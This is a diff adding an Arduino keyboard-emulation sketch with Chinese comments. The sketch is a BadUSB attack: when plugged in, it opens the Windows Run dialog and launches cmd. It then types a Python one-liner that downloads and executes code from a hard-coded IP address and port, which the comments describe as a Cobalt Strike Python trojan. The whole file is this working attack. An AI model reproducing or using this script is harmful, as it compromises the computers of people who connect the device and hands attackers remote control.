@@ -1,0 +1,57 @@
+//1. 按住win+r输入cmd进入DOS窗口
+//2. 输入cmd执行cs的python木马
+
+#include<Keyboard.h> //包含键盘模块头文件
+
+void setup(){ //初始化
+
+Keyboard.begin();//开始键盘通信
+
+delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 
+
+Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 
+
+Keyboard.press('r');//按下r键 
+
+delay(500); 
+
+Keyboard.release('r');//松掉r键 
+
+Keyboard.release(KEY_LEFT_GUI);//松掉win键 
+
+delay(500); 
+
+Keyboard.println("cmd");//输入cmd
+
+Keyboard.press(KEY_RETURN);  //按下回车键
+
+Keyboard.release(KEY_RETURN); //释放回车键
+
+delay(1000);
+
+
+
+
+Keyboard.println("python -c \"import urllib2; exec urllib2.urlopen('http://101.132.177.226:6601/a').read();\"");
+
+
+
+
+
+Keyboard.press(KEY_RETURN);  //按下回车键
+
+Keyboard.release(KEY_RETURN); //释放回车键
+
+delay(500);
+
+Keyboard.end();//结束键盘通讯 
+
+} 
+
+void loop()//循环，这里的代码
+
+{ 
+
+//循环体 写入你要循环的代码
+
+}
